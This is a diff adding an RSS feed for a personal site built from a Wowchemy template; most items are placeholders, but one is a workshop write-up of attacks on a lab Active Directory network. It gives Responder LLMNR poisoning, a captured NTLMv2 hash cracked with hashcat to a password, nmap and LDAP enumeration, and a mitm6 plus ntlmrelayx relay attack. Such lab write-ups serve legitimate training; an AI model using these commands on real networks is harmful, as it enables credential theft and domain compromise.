@@ -1,0 +1,284 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Mohamed ELLEUCH</title>
+    <link>https://mohamed-elleuch.me/</link>
+      <atom:link href="https://mohamed-elleuch.me/index.xml" rel="self" type="application/rss+xml" />
+    <description>Mohamed ELLEUCH</description>
+    <generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><copyright>Copyright © Mohamed Elleuch 2021</copyright><lastBuildDate>Sat, 01 Jun 2030 13:00:00 +0000</lastBuildDate>
+    <image>
+      <url>https://mohamed-elleuch.me/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_512x512_fill_lanczos_center_2.png</url>
+      <title>Mohamed ELLEUCH</title>
+      <link>https://mohamed-elleuch.me/</link>
+    </image>
+    
+    <item>
+      <title>Example Talk</title>
+      <link>https://mohamed-elleuch.me/talk/example-talk/</link>
+      <pubDate>Sat, 01 Jun 2030 13:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/talk/example-talk/</guid>
+      <description>&lt;div class=&#34;alert alert-note&#34;&gt;
+  &lt;div&gt;
+    Click on the &lt;strong&gt;Slides&lt;/strong&gt; button above to view the built-in slides feature.
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Slides can be added in a few ways:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Create&lt;/strong&gt; slides using Wowchemy&amp;rsquo;s &lt;a href=&#34;https://wowchemy.com/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;Slides&lt;/em&gt;&lt;/a&gt; feature and link using &lt;code&gt;slides&lt;/code&gt; parameter in the front matter of the talk file&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Upload&lt;/strong&gt; an existing slide deck to &lt;code&gt;static/&lt;/code&gt; and link using &lt;code&gt;url_slides&lt;/code&gt; parameter in the front matter of the talk file&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Embed&lt;/strong&gt; your slides (e.g. Google Slides) or presentation video on this page using &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;shortcodes&lt;/a&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Further event details, including &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;page elements&lt;/a&gt; such as image galleries, can be added to the body of this page.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>HackLock Active Directory Workshop Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/hacklockad/</link>
+      <pubDate>Tue, 23 Mar 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/hacklockad/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredoverview-of-the-network-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Overview of the network &lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;archi.png
+&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredtask-llmnr-poisoning-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;TASK: LLMNR poisoning &lt;/p&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;p-stylecolorgreenintercepting-the-user-hash-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Intercepting the user hash &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;We start by getting the network interface name&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo ifconfig
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220182306.png
+&#34; /&gt;
+We&amp;rsquo;re going to use the responder package which comes preinstalled in kali linux.
+So basically we&amp;rsquo;re going to provide our network interface to responder , and let him do its magic&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo responder -I eth0 -rdwv 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And we wait until a user accidentally make a mistake while writing his hostname instead of providing a legitimate hostname in the DNS.
+And get his NTLMv2 hash.&lt;/p&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220183501.png&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;Username:naruto
+Hash: naruto:::0099db0783fde495:F2C5BF32BD89C576A1E95A54D4BF7664:0101000000000000C0653150DE09D20121A6F48A2D912BFA000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000B1EAB93D8ABDC394076EB8F8CA0CCF66489376BD473809472A94F666423EA3C20A0010000000000000000000000000000000000009001A0063006900660073002F00310030002E0030002E0030002E0036000000000000000000
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;p-stylecolorgreencracking-the-hash-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Cracking the HASH &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;re going to use hashcat and rockyou wordlist to crack this hash,Basically we just need the Hash-Mod
+First of all, we&amp;rsquo;re going to look for NTLMv2 Hash-Mod&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://hashcat.net/wiki/doku.php?id=example_hashes&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184300.png&#34; /&gt;
+Finally run hashcat,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;hashcat.exe -m 5600 hash.txt rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184655.png&#34; /&gt;
+And we wait until hashcat cracks it&lt;/p&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220184750.png&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;
+NARUTO:::bb5943c5efa0d0b9:b8a5d31bab00af7d8d013d1d7142dbdf:0101000000000000c0653150de09d201542d404b9a268f50000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d20106000400020000000800300030000000000000000000000000300000b1eab93d8abdc394076eb8f8ca0ccf66489376bd473809472a94f666423ea3c20a0010000000000000000000000000000000000009001a0063006900660073002f00310030002e0030002e0030002e0036000000000000000000:kelvinP@ssw0rd 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;p-stylecolorgreenflagp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;FLAG&lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Securinets{kelvinP@ssw0rd}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;p-stylecolorredtask-ipv6-attack-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Task: IPv6 Attack &lt;/p&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;p-stylecolorgreenpreparing-for-the-attack--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Preparing for the Attack  &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;re going to start with gathering informations about the network&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo ifconfig
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220182306.png&#34; /&gt;
+&lt;code&gt;Network address: 10.0.0.0/24&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s now find the hosts IPs, It may take a while&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap 10.0.0.0/24 -Pn | grep 10.0.0 | awk &#39;{print $6}&#39; | uniq &amp;gt; ips.txt 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let&amp;rsquo;s an nmap scan on the result&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -sV -n -v -Pn -p- T4 -iL ips.txt -A --open -oA nmap
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Or you can directly&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -p- T4 10.0.0.0/24 -oA nmap 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220195053.png&#34; /&gt;
+&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220195212.png&#34; /&gt;
+After viewing the nmap results we can see that 10.0.0.7 is ip of the domain controller&lt;/p&gt;
+&lt;p&gt;We can get the domain name either from the nmap results or by enumerating the ldap&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ldapsearch -h 10.0.0.7 -x -s base namingcontexts
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220194446.png&#34; /&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;namingcontexts: DC=SECURINETS,DC=local
+// SECURINETS.local is the domain name
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;p-stylecolorgreenattacking--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Attacking  &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;So basically we&amp;rsquo;re going to  acts as an IPv6 router responsding to configuration request from the machine and assign it with an IPv6 address and an IPv6 DNS server. We going to use mitm6 ( &lt;a href=&#34;https://github.com/fox-it/mitm6&#34;&gt;https://github.com/fox-it/mitm6&lt;/a&gt; ) which will act as IPv6 Router during the attack  and ntlmrelayx  ( Comes preinstalled in kali ) to capture the credentials and relay them to target machine.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s start by setting up mitm6&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo mitm6 -d SECURINETS.local
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s now set up our ntlm relay&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo impacket-ntlmrelayx -6 -t ldaps://10.0.0.7 -wh pwned.SECURINETS.local -l l00t
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200338.png&#34; /&gt;
+And wait until we get something juicy&lt;/p&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200440.png&#34; /&gt;
+A folder l00t has been created which contains informations about the AD&lt;/p&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220200621.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;And we grab our flag&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;cat * | grep Securinets
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img class=&#34;special-img-class&#34; src=&#34;Pasted image 20210220201212.png&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreen-flag--p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt; Flag  &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;Securinets{U_D1d_W3ll_S0lv1ng_Th1s_AD_Master}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Slides</title>
+      <link>https://mohamed-elleuch.me/slides/example/</link>
+      <pubDate>Tue, 05 Feb 2019 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/slides/example/</guid>
+      <description>&lt;h1 id=&#34;create-slides-in-markdown-with-wowchemy&#34;&gt;Create slides in Markdown with Wowchemy&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://wowchemy.com/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Wowchemy&lt;/a&gt; | &lt;a href=&#34;https://owchemy.com/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;features&#34;&gt;Features&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Efficiently write slides in Markdown&lt;/li&gt;
+&lt;li&gt;3-in-1: Create, Present, and Publish your slides&lt;/li&gt;
+&lt;li&gt;Supports speaker notes&lt;/li&gt;
+&lt;li&gt;Mobile friendly slides&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;controls&#34;&gt;Controls&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Next: &lt;code&gt;Right Arrow&lt;/code&gt; or &lt;code&gt;Space&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Previous: &lt;code&gt;Left Arrow&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Start: &lt;code&gt;Home&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Finish: &lt;code&gt;End&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Overview: &lt;code&gt;Esc&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Speaker notes: &lt;code&gt;S&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Fullscreen: &lt;code&gt;F&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Zoom: &lt;code&gt;Alt + Click&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/hakimel/reveal.js#pdf-export&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PDF Export&lt;/a&gt;: &lt;code&gt;E&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;code-highlighting&#34;&gt;Code Highlighting&lt;/h2&gt;
+&lt;p&gt;Inline code: &lt;code&gt;variable&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Code block:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;porridge = &amp;quot;blueberry&amp;quot;
+if porridge == &amp;quot;blueberry&amp;quot;:
+    print(&amp;quot;Eating...&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;math&#34;&gt;Math&lt;/h2&gt;
+&lt;p&gt;In-line math: $x + y = z$&lt;/p&gt;
+&lt;p&gt;Block math:&lt;/p&gt;
+&lt;p&gt;$$
+f\left( x \right) = ;\frac{{2\left( {x + 4} \right)\left( {x - 4} \right)}}{{\left( {x + 4} \right)\left( {x + 1} \right)}}
+$$&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;fragments&#34;&gt;Fragments&lt;/h2&gt;
+&lt;p&gt;Make content appear incrementally&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{{% fragment %}} One {{% /fragment %}}
+{{% fragment %}} **Two** {{% /fragment %}}
+{{% fragment %}} Three {{% /fragment %}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Press &lt;code&gt;Space&lt;/code&gt; to play!&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;fragment &#34; &gt;
+One
+&lt;/span&gt;
+&lt;span class=&#34;fragment &#34; &gt;
+&lt;strong&gt;Two&lt;/strong&gt;
+&lt;/span&gt;
+&lt;span class=&#34;fragment &#34; &gt;
+Three
+&lt;/span&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;A fragment can accept two optional parameters:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;class&lt;/code&gt;: use a custom style (requires definition in custom CSS)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;weight&lt;/code&gt;: sets the order in which a fragment appears&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;speaker-notes&#34;&gt;Speaker Notes&lt;/h2&gt;
+&lt;p&gt;Add speaker notes to your presentation&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-markdown&#34;&gt;{{% speaker_note %}}
+- Only the speaker can read these notes
+- Press `S` key to view
+{{% /speaker_note %}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Press the &lt;code&gt;S&lt;/code&gt; key to view the speaker notes!&lt;/p&gt;
+&lt;aside class=&#34;notes&#34;&gt;
+  &lt;ul&gt;
+&lt;li&gt;Only the speaker can read these notes&lt;/li&gt;
+&lt;li&gt;Press &lt;code&gt;S&lt;/code&gt; key to view&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;/aside&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;themes&#34;&gt;Themes&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;black: Black background, white text, blue links (default)&lt;/li&gt;
+&lt;li&gt;white: White background, black text, blue links&lt;/li&gt;
+&lt;li&gt;league: Gray background, white text, blue links&lt;/li&gt;
+&lt;li&gt;beige: Beige background, dark text, brown links&lt;/li&gt;
+&lt;li&gt;sky: Blue background, thin dark text, blue links&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;night: Black background, thick white text, orange links&lt;/li&gt;
+&lt;li&gt;serif: Cappuccino background, gray text, brown links&lt;/li&gt;
+&lt;li&gt;simple: White background, black text, blue links&lt;/li&gt;
+&lt;li&gt;solarized: Cream-colored background, dark green text, blue links&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+
+&lt;section data-noprocess data-shortcode-slide
+  
+      
+      data-background-image=&#34;/media/boards.jpg&#34;
+  &gt;
+
+&lt;h2 id=&#34;custom-slide&#34;&gt;Custom Slide&lt;/h2&gt;
+&lt;p&gt;Customize the slide style and background&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-markdown&#34;&gt;{{&amp;lt; slide background-image=&amp;quot;/media/boards.jpg&amp;quot; &amp;gt;}}
+{{&amp;lt; slide background-color=&amp;quot;#0000FF&amp;quot; &amp;gt;}}
+{{&amp;lt; slide class=&amp;quot;my-style&amp;quot; &amp;gt;}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;custom-css-example&#34;&gt;Custom CSS Example&lt;/h2&gt;
+&lt;p&gt;Let&amp;rsquo;s make headers navy colored.&lt;/p&gt;
+&lt;p&gt;Create &lt;code&gt;assets/css/reveal_custom.css&lt;/code&gt; with:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-css&#34;&gt;.reveal section h1,
+.reveal section h2,
+.reveal section h3 {
+  color: navy;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;questions&#34;&gt;Questions?&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/wowchemy/wowchemy-hugo-modules/discussions&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Ask&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://wowchemy.com/docs/managing-content/#create-slides&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>An example conference paper</title>
+      <link>https://mohamed-elleuch.me/publication/example/</link>
+      <pubDate>Mon, 01 Jul 2013 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/publication/example/</guid>
+      <description>&lt;div class=&#34;alert alert-note&#34;&gt;
+  &lt;div&gt;
+    Click the &lt;em&gt;Cite&lt;/em&gt; button above to demo the feature to enable visitors to import publication metadata into their reference management software.
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;div class=&#34;alert alert-note&#34;&gt;
+  &lt;div&gt;
+    Create your slides in Markdown - click the &lt;em&gt;Slides&lt;/em&gt; button to check out the example.
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;Supplementary notes can be added here, including &lt;a href=&#34;https://wowchemy.com/docs/writing-markdown-latex/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;code, math, and images&lt;/a&gt;.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title></title>
+      <link>https://mohamed-elleuch.me/admin/config.yml</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/admin/config.yml</guid>
+      <description></description>
+    </item>
+    
+  </channel>
+</rss>
